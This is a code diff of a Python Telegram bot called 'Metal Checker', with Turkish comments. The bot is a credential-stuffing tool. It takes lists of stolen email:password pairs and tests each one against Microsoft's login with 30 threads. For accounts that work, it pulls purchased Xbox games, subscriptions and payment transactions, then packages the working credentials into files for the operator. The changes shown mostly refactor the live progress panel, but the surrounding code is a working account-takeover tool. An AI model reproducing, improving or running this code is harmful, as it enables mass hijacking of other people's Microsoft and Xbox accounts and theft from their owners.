@@ -6,7 +6,7 @@ import json
 import threading
 import concurrent.futures
 import io
-from datetime import datetime, timedelta
+from datetime import datetime
 import requests
 import urllib3
 import warnings
@@ -26,17 +26,16 @@ OWNER_ID = int(os.getenv("OWNER_ID", "8664147577"))
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# Network is unreachable hatası için güvenli istek adaptörü
+# Ağ kopmalarına karşı en katı istek koruması
 session_tg = requests.Session()
 retries = Retry(total=5, backoff_factor=1, status_forcelist=[500, 502, 503, 504])
 session_tg.mount("https://", HTTPAdapter(max_retries=retries))
 
 def safe_bot_call(func, *args, **kwargs):
-    """Railway ağ kopmalarında botun çökmesini engelleyen koruma kalkanı"""
     try:
         return func(*args, **kwargs)
     except Exception as e:
-        print(f"[⚠️ TELEGRAM AĞ HATASI BAYPAS EDİLDİ]: {e}")
+        print(f"[⚠️ TELEGRAM API HATASI]: {e}")
         return None
 
 # ==========================================
@@ -58,18 +57,17 @@ if OWNER_ID not in db["admins"]:
     save_db()
 
 # ==========================================
-# 🌍 LOCALIZATION (TR / EN)
+# 🌍 LOCALIZATION & KEYBOARDS
 # ==========================================
 LANG = {
     "tr": {
-        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin / Please choose a language to continue:",
+        "welcome": "👋 *Metal Checker Botuna Hoş Geldiniz!* \n\nLütfen devam etmek için bir dil seçin:",
         "main_menu": "📱 *Ana Menü* \n\nBir işlem seçiniz:",
         "btn_check": "🚀 Hesap Tara (.txt)",
         "btn_merge": "📂 Dosya Birleştir",
         "btn_stats": "📊 İstatistiklerim",
-        "btn_admin": "👑 Admin Paneli",
         "btn_lang": "🌐 Dil Değiştir (Language)",
-        "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır. Durdurmak için /stop yazabilirsiniz.",
+        "scan_started": "🚀 Tarama başlatıldı! Canlı panel anlık olarak akacaktır.",
     },
     "en": {
         "welcome": "👋 *Welcome to Metal Checker Bot!* \n\nPlease choose a language to continue:",
@@ -77,9 +75,8 @@ LANG = {
         "btn_check": "🚀 Scan Accounts (.txt)",
         "btn_merge": "📂 Merge Files",
         "btn_stats": "📊 My Statistics",
-        "btn_admin": "👑 Admin Panel",
         "btn_lang": "🌐 Change Language",
-        "scan_started": "🚀 Scan started! Dashboard is updating live. Send /stop to abort.",
+        "scan_started": "🚀 Scan started! Dashboard is updating live.",
     }
 }
 
@@ -97,12 +94,10 @@ def main_keyboard(user_id):
     markup = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
     markup.row(get_text(user_id, "btn_check"), get_text(user_id, "btn_merge"))
     markup.row(get_text(user_id, "btn_stats"), get_text(user_id, "btn_lang"))
-    if user_id in db["admins"]:
-        markup.row(get_text(user_id, "btn_admin"))
     return markup
 
 # ==========================================
-# 🧠 MICROSOFT CHECKER ENGINE
+# 🧠 MICROSOFT & XBOX CORE AUTH ENGINE
 # ==========================================
 SFTAG_URL = (
     "https://login.live.com/oauth20_authorize.srf"
@@ -249,7 +244,7 @@ def get_payment_transactions(session, ms_token):
     return []
 
 # ==========================================
-# 🔄 STATE MANAGEMENT
+# 🔄 CONTEXT STATE MANAGEMENT
 # ==========================================
 active_scans = {}
 user_game_filter = {}
@@ -266,7 +261,7 @@ class BotScanContext:
         self.twofa = 0
         self.errors = 0
 
-        # Canlı Panel Sayaçları
+        # Canlı Panel Sayaç Odaları
         self.gp_ultimate = 0
         self.gp_pc = 0
         self.gp_essential = 0
@@ -302,7 +297,6 @@ class BotScanContext:
         self.is_running = True
         self.lock = threading.Lock()
         self.message_id = None
-        self.last_update_time = 0
 
 def check_account_bot(context, combo):
     if not context.is_running: return
@@ -322,11 +316,9 @@ def check_account_bot(context, combo):
         ms_token, auth_status = microsoft_auth(session, email, password, url_post, sftag)
         if auth_status == "2fa":
             with context.lock: context.twofa += 1; context.checked += 1; context.twofa_list.append(combo)
-            trigger_live_update(context)
             return
         elif auth_status == "bad":
             with context.lock: context.bad += 1; context.checked += 1; context.bad_list.append(combo)
-            trigger_live_update(context)
             return
         elif auth_status != "success" or not ms_token: raise Exception("ms")
 
@@ -365,10 +357,12 @@ def check_account_bot(context, combo):
                 context.hits += 1
                 context.hit_list.append(f"{email}:{password}")
                 
+                # Sadece oyunu olanlar purchased_items'a
                 if has_any_game:
                     games_str = "\n".join([f"{i} - {g}" for i, g in enumerate(purchased_games, 1)])
                     context.purchased_items_list.append(f"Email: {email}\nPassword: {password}\nGamesList:\n{games_str}\n— Checker by Icardi\n{'='*50}\n")
 
+                # Sadece aboneliği olanlar Subscriptions'a
                 if has_premium_sub:
                     sub_entry = f"Email: {email} | Pass: {password}\nActive Subscriptions:\n" + "\n".join([f" ➡️ {sb}" for sb in subs]) + f"\n{'-'*40}\n"
                     context.subscriptions_list.append(sub_entry)
@@ -398,23 +392,13 @@ def check_account_bot(context, combo):
                 elif "realms" in sl: context.realms += 1
                 elif "windows 365" in sl: context.win355 += 1
                 elif "casual" in sl: context.casual += 1
-
-        trigger_live_update(context)
     except:
         with context.lock: context.errors += 1; context.checked += 1
-        trigger_live_update(context)
 
-def trigger_live_update(context, force=False):
-    """Anlık sıfır gecikmeli panel basıcı"""
-    current = time.time()
-    # İlk başlangıçta veya hit geldiğinde bekleme yapmadan direkt basar
-    if not force and (current - context.last_update_time < 0.7): return 
-    context.last_update_time = current
-    
+def generate_panel_text(context):
     pct = (context.checked / context.total) * 100 if context.total > 0 else 0
-    
-    text = (
-        f"⚡ *METAL CHECKER ANLIK PANEL v4.6* ⚡\n"
+    return (
+        f"⚡ *METAL CHECKER ANLIK PANEL v5.0* ⚡\n"
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"🟢 Hit (Oyun/Sub'lı): `{context.hits}`\n"
         f"🔴 Hatalı (Bad): `{context.bad}`\n"
@@ -448,11 +432,18 @@ def trigger_live_update(context, force=False):
         f"━━━━━━━━━━━━━━━━━━━━━━━\n"
         f"📈 İlerleme: `[{context.checked}/{context.total}]` — `% {pct:.1f}`"
     )
-    safe_bot_call(bot.edit_message_text, text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
 
-def complete_scan_loop(context):
+def live_refresh_loop(context):
+    """Ana kilitlenmeyi çözen, saniyede 1 kez stabil çalışan ekran tazeleyici döngü"""
     while context.is_running and context.checked < context.total:
-        time.sleep(1)
+        text = generate_panel_text(context)
+        if context.message_id:
+            safe_bot_call(bot.edit_message_text, text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
+        time.sleep(1.2) # Telegram hız limitine çarpmayan altın süre oranı
+
+    # Tarama bittiğinde son halini basıyoruz
+    text = generate_panel_text(context)
+    safe_bot_call(bot.edit_message_text, text, chat_id=context.chat_id, message_id=context.message_id, parse_mode="Markdown")
     
     safe_bot_call(bot.send_message, context.chat_id, "📦 *Tarama bitti! Dosyalarınız temizlenerek oluşturuluyor...*", parse_mode="Markdown")
     
@@ -528,19 +519,21 @@ def handle_all(message):
         context = BotScanContext(chat_id, user_id, combos, filter_str=game_filter)
         active_scans[chat_id] = context
 
-        # EKALAN GÜNCELLEMESİ: .txt bota düştüğü an, hiç beklemeden boş şablon paneli basıyoruz!
-        init_msg = safe_bot_call(bot.send_message, chat_id, "⏳ Panel hazırlanıyor...", reply_markup=main_keyboard(user_id))
-        if init_msg: 
-            context.message_id = init_msg.message_id
-            trigger_live_update(context, force=True) # Anında tetikleme
-
-        threading.Thread(target=complete_scan_loop, args=(context,), daemon=True).start()
+        # 🚨 HATA ÇÖZÜMÜ: Mesajı direkt oluşturup ID'sini anında context'e yazıyoruz
+        text_ilk = generate_panel_text(context)
+        init_msg = safe_bot_call(bot.send_message, chat_id, text_ilk, reply_markup=main_keyboard(user_id), parse_mode="Markdown")
         
-        def start_pool():
-            with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
-                futures = [executor.submit(check_account_bot, context, cb) for cb in combos]
-                concurrent.futures.wait(futures)
-        threading.Thread(target=start_pool, daemon=True).start()
+        if init_msg:
+            context.message_id = init_msg.message_id
+            
+            # Yenileme döngüsünü ve işçi thread havuzunu eş zamanlı başlatıyoruz
+            threading.Thread(target=live_refresh_loop, args=(context,), daemon=True).start()
+            
+            def start_pool():
+                with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
+                    futures = [executor.submit(check_account_bot, context, cb) for cb in combos]
+                    concurrent.futures.wait(futures)
+            threading.Thread(target=start_pool, daemon=True).start()
 
 @bot.callback_query_handler(func=lambda call: True)
 def handle_callbacks(call):
